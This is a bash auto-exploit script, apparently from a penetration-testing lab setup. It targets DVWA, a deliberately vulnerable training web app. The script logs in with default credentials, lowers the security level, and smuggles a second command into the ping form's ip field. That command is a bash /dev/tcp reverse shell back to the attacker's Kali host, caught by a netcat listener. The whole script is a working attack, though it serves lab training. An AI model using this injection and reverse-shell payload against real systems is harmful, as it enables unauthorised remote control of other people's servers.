#!/bin/bash
# DVWA Command Injection auto-exploit
# Gets a reverse shell via command injection vulnerability
#
# Usage: pwn dvwa (from the pwn wrapper)

DVWA_IP="172.20.0.10"
KALI_IP="172.20.0.5"
LPORT="4444"

echo "[*] DVWA Command Injection Auto-Exploit"
echo "[*] Target: http://$DVWA_IP (DVWA)"
echo "[*] Getting reverse shell to $KALI_IP:$LPORT"
echo ""

# Step 1: Login to DVWA and get session cookie
echo "[1/4] Logging in to DVWA (admin/password)..."
COOKIE=$(curl -s -c - -X POST "http://$DVWA_IP/login.php" \
    -d "username=admin&password=password&Login=Login" \
    2>/dev/null | grep PHPSESSID | awk '{print $NF}')

if [ -z "$COOKIE" ]; then
    echo "[-] Failed to get session cookie. Is DVWA running?"
    echo "    Start it with: docker compose up -d dvwa"
    exit 1
fi
echo "[+] Got session: $COOKIE"

# Step 2: Set security to Low
echo "[2/4] Setting security to Low..."
curl -s -b "PHPSESSID=$COOKIE;security=low" \
    -X POST "http://$DVWA_IP/security.php" \
    -d "security=low&seclev_submit=Submit" >/dev/null

# Step 3: Start listener in background and inject reverse shell
echo "[3/4] Starting listener on port $LPORT..."
echo "[4/4] Injecting reverse shell payload..."
echo ""
echo "[*] You should get a shell below. Type 'id' to verify access."
echo "[*] Upgrade shell with: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
echo ""

# Use timeout + subshell: trigger the exploit, then connect to listener
(
    sleep 1
    # URL-encoded payload: 127.0.0.1; bash -i >& /dev/tcp/172.20.0.5/4444 0>&1
    curl -s -b "PHPSESSID=$COOKIE;security=low" \
        "http://$DVWA_IP/vulnerabilities/exec/" \
        --data-urlencode "ip=127.0.0.1; bash -i >& /dev/tcp/$KALI_IP/$LPORT 0>&1" \
        -d "Submit=Submit" >/dev/null 2>&1
) &

# Foreground listener catches the shell
nc -lvnp $LPORT
